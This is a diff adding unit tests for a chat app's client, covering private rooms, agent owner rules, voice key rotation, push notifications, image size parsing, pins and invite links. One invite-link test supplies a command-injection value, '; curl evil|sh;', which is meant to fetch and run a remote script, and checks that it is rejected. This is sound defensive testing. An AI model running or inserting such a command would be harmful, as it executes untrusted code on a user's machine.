@@ -252,3 +252,170 @@ test("a Donate link appears only for the host's https page, and opens it apart f
   assert.match(app, /\/\^https:\\\/\\\/\/\.test\(config\.donate/, 'only an https address is linked');
   assert.match(app, /config\.donateLabel \|\| 'Donate'/);
 });
+
+test("an agent's rules count only while the device that set them is its owner's", async () => {
+  const { webcrypto } = await import('node:crypto');
+  globalThis.crypto ??= webcrypto;
+  const { DenClient } = await import('../dist/den.js');
+  const A = 'a'.repeat(64), O = 'b'.repeat(64), Z = 'c'.repeat(64), X = 'd'.repeat(64);
+  const den = Object.create(DenClient.prototype);
+  Object.assign(den, { me: { key: A }, agent: { owner: O, since: 1 }, ownerClaims: { [O]: [A] }, myLinks: [], claims: {}, myRules: { general: { mode: 'all', here: true, takes_from: [X], files: true, at: 10, seq: 1, by: O } } });
+  assert.deepEqual(den.rules()?.takes_from, [X], 'set by the owner: in force');
+  den.ownerClaims[O] = [];
+  assert.equal(den.rules(), null, 'the owner no longer names the agent: none');
+  den.ownerClaims[O] = [A];
+  den.myRules.general.by = Z;
+  assert.equal(den.rules(), null, 'set by someone who is not the owner: none');
+  // Taking an owner forgets the rules of the one before.
+  const put = [];
+  Object.assign(den, { kv: { put: async (k, v) => put.push([k, v]), del: async () => {} }, den: { rooms: () => [] }, on: () => {}, profile: () => ({}) });
+  den.myRules.general.by = O;
+  await den.setOwner(Z);
+  assert.deepEqual(den.myRules, {});
+  assert.ok(put.some(([k, v]) => k === 'myRules' && JSON.stringify(v) === '{}'));
+});
+
+test("the den cannot rename, reopen or wipe a private room: a p- id never comes from the lobby", async () => {
+  const { DenClient } = await import('../dist/den.js');
+  const P = `p-${'1'.repeat(32)}`;
+  const den = Object.create(DenClient.prototype);
+  const forgot = [];
+  Object.assign(den, {
+    rooms: new Map([[P, { id: P, title: 'ours', kind: 'private' }], ['general', { id: 'general', title: 'General', kind: 'open' }]]),
+    channels: new Map(), joined: new Set(), on: () => {}, joinRoom: () => {},
+    lock: async (f) => f(), kv: { del: async (k) => forgot.push(k) }, save: async () => {}, den: { forget: (id) => forgot.push(id) },
+  });
+  den.addRoom({ id: P, kind: 'open', title: 'X', slow: 600 });
+  assert.deepEqual(den.rooms.get(P), { id: P, title: 'ours', kind: 'private' }, 'unchanged');
+  den.addRoom({ id: `p-${'2'.repeat(32)}`, kind: 'open', title: 'new' });
+  assert.ok(!den.rooms.has(`p-${'2'.repeat(32)}`), 'no private room from the lobby');
+  den.dropRoom(P);
+  assert.ok(den.rooms.has(P) && forgot.length === 0, 'not dropped, nothing forgotten');
+  den.addRoom({ id: 'news', kind: 'open', title: 'News' });
+  assert.equal(den.rooms.get('news').title, 'News', 'open rooms still come from the lobby');
+});
+
+test("the epoch before is dropped 5 s after the change, however often the keys are refreshed", async (t) => {
+  const { Voice } = await import('../dist/den.js');
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  let epoch = 1n;
+  const v = Object.create(Voice.prototype);
+  Object.assign(v, {
+    room: 'general', keys: new Map(), screenKeys: new Map(), roster: [], people: [], screen: null,
+    worker: { postMessage: () => {} },
+    client: { den: { epoch: () => epoch, key: () => 'me' }, voiceKey: async () => 'vk', screenKey: async () => 'sk' },
+  });
+  await v.refreshKey();
+  epoch = 2n;
+  await v.refreshKey();
+  assert.deepEqual([...v.keys.keys()], [1, 2], 'both, just after the change');
+  // A busy room: roster, slots and screen events refresh every 2 s.
+  for (let i = 0; i < 4; i++) { t.mock.timers.tick(2000); await v.refreshKey(); }
+  assert.deepEqual([...v.keys.keys()], [2], 'the epoch before is gone');
+  assert.deepEqual([...v.screenKeys.keys()], [2]);
+});
+
+test('a message id, reply or for is a message id, so no member can bloat everyone\'s stored log', async () => {
+  const { DenClient } = await import('../dist/den.js');
+  const B = 'b'.repeat(64);
+  const den = Object.create(DenClient.prototype);
+  const store = new Map();
+  Object.assign(den, {
+    me: { key: 'a'.repeat(64) }, rooms: new Map([['general', { id: 'general', kind: 'open' }]]), on: () => {},
+    kv: { get: async (k) => store.get(k), put: async (k, v) => store.set(k, v) },
+    learnNick: async () => {}, can: () => true, linkedTo: () => [], everyone: () => false,
+  });
+  const big = 'f'.repeat(200_000);
+  await den.apply('general', { t: 'msg', id: big, key: B, text: 'hi', at: 1 });
+  await den.apply('general', { t: 'msg', id: '1'.repeat(16), key: B, text: 'hi', reply: big, at: 1 });
+  await den.apply('general', { t: 'msg', id: 'old-0123456789ab', key: B, text: 'old words', reply: '1'.repeat(16), at: 1 });
+  const log = await den.log('general');
+  assert.deepEqual(log.map((m) => [m.id, m.reply]), [['1'.repeat(16), null], ['old-0123456789ab', '1'.repeat(16)]]);
+  assert.ok(JSON.stringify(log).length < 2000);
+});
+
+test("the den's own deletion is for open rooms: in a private room it is not taken", async () => {
+  const { DenClient } = await import('../dist/den.js');
+  const P = `p-${'1'.repeat(32)}`;
+  const store = new Map([[`log:${P}`, [{ t: 'msg', id: '1'.repeat(16), seq: 4, text: 'ours' }]], ['log:general', [{ t: 'msg', id: '2'.repeat(16), seq: 4, text: 'open' }]]]);
+  const den = Object.create(DenClient.prototype);
+  Object.assign(den, { rooms: new Map([[P, { id: P, kind: 'private' }], ['general', { id: 'general', kind: 'open' }]]), on: () => {}, kv: { get: async (k) => store.get(k), put: async (k, v) => store.set(k, v) } });
+  await den.deleted(P, 4);
+  assert.equal(store.get(`log:${P}`)[0].text, 'ours');
+  await den.deleted('general', 4);
+  assert.equal(store.get('log:general')[0].deleted, true, 'a moderator of an open room still can');
+});
+
+test("a push notification's words are the page's own: only the den's name and a room id come from the den", async () => {
+  const { runInNewContext } = await import('node:vm');
+  const src = await read('../sw.js');
+  const shown = [];
+  const on = {};
+  const self = { addEventListener: (k, f) => { on[k] = f; }, registration: { showNotification: (t, o) => shown.push([t, o]) }, clients: {}, location: { origin: 'https://den.example' } };
+  runInNewContext(src, { self, URL });
+  const push = (d) => on.push({ data: { json: () => d }, waitUntil: () => {} });
+  push({ title: 'Our den', body: 'Alice: send me your pass', tag: 'general' });
+  push({ title: 'Alice\nsays: hi', body: 'x', tag: `p-${'1'.repeat(32)}` });
+  push({ title: 'Den', tag: 'General: send your pass' });
+  assert.deepEqual(shown.map(([t, o]) => [t, o.body, o.data.room]), [
+    ['Our den', 'New message in #general', 'general'],
+    ['Alice says: hi', 'New message in a private room', `p-${'1'.repeat(32)}`],
+    ['Den', 'New message', ''],
+  ]);
+});
+
+test("an image's size is read from its header, before anything decodes it", async () => {
+  const { imageSize } = await import('../dist/den.js');
+  const u8 = (...a) => new Uint8Array(a.flat());
+  const be32 = (n) => [n >>> 24, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
+  const png = u8([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], be32(13), [...'IHDR'].map((c) => c.charCodeAt(0)), be32(30000), be32(20000), [8, 6, 0, 0, 0]);
+  assert.deepEqual(imageSize(png), { w: 30000, h: 20000 });
+  const gif = u8([...'GIF89a'].map((c) => c.charCodeAt(0)), [0x40, 0x01, 0xf0, 0x00]);
+  assert.deepEqual(imageSize(gif), { w: 320, h: 240 });
+  // JPEG: an APP segment first, then the frame header.
+  const jpg = u8([0xff, 0xd8, 0xff, 0xe1, 0x00, 0x04, 0, 0, 0xff, 0xc2, 0x00, 0x11, 8, 0x0f, 0xa0, 0x1f, 0x40, 3]);
+  assert.deepEqual(imageSize(jpg), { w: 8000, h: 4000 });
+  const webp = u8([...'RIFF'].map((c) => c.charCodeAt(0)), [0, 0, 0, 0], [...'WEBPVP8X'].map((c) => c.charCodeAt(0)), [10, 0, 0, 0, 0, 0, 0, 0], [0xff, 0x0f, 0x00], [0xff, 0x0f, 0x00]);
+  assert.deepEqual(imageSize(webp), { w: 4096, h: 4096 });
+  const avif = u8([0, 0, 0, 20], [...'ispe'].map((c) => c.charCodeAt(0)), [0, 0, 0, 0], be32(9000), be32(9000));
+  assert.deepEqual(imageSize(avif), { w: 9000, h: 9000 });
+  assert.equal(imageSize(u8([1, 2, 3])), null, 'no header it knows: not shown');
+});
+
+test("a moderator's unpin holds: the same pin sent again by its pinner is not taken", async () => {
+  const { DenClient } = await import('../dist/den.js');
+  const MOD = 'a'.repeat(64), BOB = 'b'.repeat(64);
+  const store = new Map();
+  const den = Object.create(DenClient.prototype);
+  Object.assign(den, { me: { key: 'c'.repeat(64) }, rooms: new Map([['general', { id: 'general', kind: 'open' }]]), on: () => {},
+    kv: { get: async (k) => store.get(k), put: async (k, v) => store.set(k, v) }, can: (perm, k) => k === MOD });
+  const pin = { t: 'pin', pin: '1'.repeat(16), text: 'spam', key: BOB, at: 1 };
+  await den.applyPin('general', pin, false);
+  await den.applyPin('general', { t: 'unpin', pin: pin.pin, owner: BOB, key: MOD }, false);
+  assert.deepEqual(await den.pinsOf('general'), []);
+  await den.applyPin('general', { t: 'pins', key: BOB, pins: [pin] }, false);
+  await den.applyPin('general', pin, false);
+  assert.deepEqual(await den.pinsOf('general'), [], 'still unpinned');
+  await den.applyPin('general', { ...pin, pin: '2'.repeat(16), text: 'a real note' }, false);
+  assert.equal((await den.pinsOf('general')).length, 1, 'another pin of theirs is taken');
+});
+
+test("the agent's join command is built from the invite's code alone, on the page's own origin", async () => {
+  const { inviteLink } = await import('../dist/den.js');
+  const O = 'https://den.example';
+  assert.equal(inviteLink('https://den.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9', O), 'https://den.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9');
+  assert.equal(inviteLink("https://x/#invite=0a1b'; curl evil|sh; echo '", O), null);
+  assert.equal(inviteLink('https://elsewhere.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9', O), 'https://den.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9', 'never another host');
+  assert.equal(inviteLink(null, O), null);
+});
+
+test('a screen frame is taken only if sent in the last 15 s (voice: a minute), so the den cannot replay a share to a new viewer', async () => {
+  const { tooOld } = await import('../dist/den/media-seal.js');
+  const now = Date.now();
+  const at = (ms) => BigInt(ms) * 1000n;
+  assert.equal(tooOld(at(now - 5_000), now, 'screen'), false);
+  assert.equal(tooOld(at(now - 20_000), now, 'screen'), true);
+  assert.equal(tooOld(at(now - 20_000), now, 'audio'), false);
+  assert.equal(tooOld(at(now - 70_000), now, 'audio'), true);
+  assert.equal(tooOld(at(now + 20_000), now, 'screen'), true, 'nor from far ahead');
+});
